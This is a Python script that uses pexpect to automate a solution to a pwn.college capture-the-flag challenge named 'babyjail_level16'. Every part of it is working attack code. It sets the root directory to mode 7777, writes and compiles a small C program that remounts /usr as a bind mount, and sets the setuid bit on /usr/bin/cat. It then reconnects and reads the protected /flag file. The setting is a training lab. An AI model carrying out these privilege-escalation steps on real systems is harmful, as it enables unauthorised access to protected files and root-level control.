def exploit(): # Using the root privileges of the VM, we will elevate permissions, compile and execute a C program to mount and bind the /usr directory, 
               # then elevate the privileges of the 'cat' binary to allow reading the flag.
               # It may require multiple attempts as it might not work the first time.
            
    child = pexpect.spawn('vm connect')  # Connect to the VM
    child.expect(r'Last login:', timeout=30)  # Wait for the "Last login:" message indicating the connection is established
    time.sleep(2)
    
    child.sendline('/challenge/babyjail_level16')  # Execute the challenge binary
    child.expect(r'bash-5.0# ', timeout=30)  # Wait for the bash prompt in the jail environment
    
    child.sendline('chmod 7777 /')  # Set permissions of root directory to 7777 to elevate privileges
    child.expect(r'bash-5.0# ', timeout=30)
    
    commands = [  # Create a file exploit.c with the necessary code to mount and bind /usr to access it
        "echo '#include <stdio.h>' > /exploit.c",
        "echo '#include <assert.h>' >> /exploit.c",
        "echo '#include <sys/mount.h>' >> /exploit.c",
        "echo 'int main(){' >> /exploit.c",
        "echo '    assert(mount(NULL, \"/usr\", NULL, MS_REMOUNT | MS_BIND, NULL) != -1);' >> /exploit.c",
        "echo '    return 0;' >> /exploit.c",
        "echo '}' >> /exploit.c"
    ]
    for cmd in commands:
        child.sendline(cmd)  # Send each command to create the exploit.c file
        child.expect(r'bash-5.0# ', timeout=30)

    child.sendline('gcc /exploit.c -o /exploit')  # Compile the exploit.c file
    child.expect(r'bash-5.0# ', timeout=30)
    
    child.sendline('/exploit')  # Execute the compiled exploit file
    child.expect(r'bash-5.0# ', timeout=30)
    
    child.sendline('chmod u+s /usr/bin/cat')  # Change the permissions of /usr/bin/cat to allow reading the flag outside the program
    child.expect(r'bash-5.0# ', timeout=30)
    
    child.sendline('exit')  # Exit the child session
    child.expect(r'\$', timeout=30)
    child.close()
    
    parent = pexpect.spawn('vm connect')  # Reconnect to the VM
    parent.expect(r'Last login:', timeout=30)
    time.sleep(2)
    
    parent.sendline('cd /usr/bin')  # Change directory to /usr/bin
    parent.expect(r'\$', timeout=30)
    parent.sendline('cat /flag')  # Read the flag with the 'cat' binary
    parent.expect(r'pwn\.college\{.*?\}', timeout=30)
    flag = parent.after.decode().strip()  # Decode and strip any extra whitespace from the flag
    print(f'Flag: {flag}')  # Print the flag
    
    parent.sendline('exit')  # Exit the parent session
    parent.expect(r'\$', timeout=30)
    parent.close()

if __name__ == "__main__":
    exploit()  # Execute the exploit function
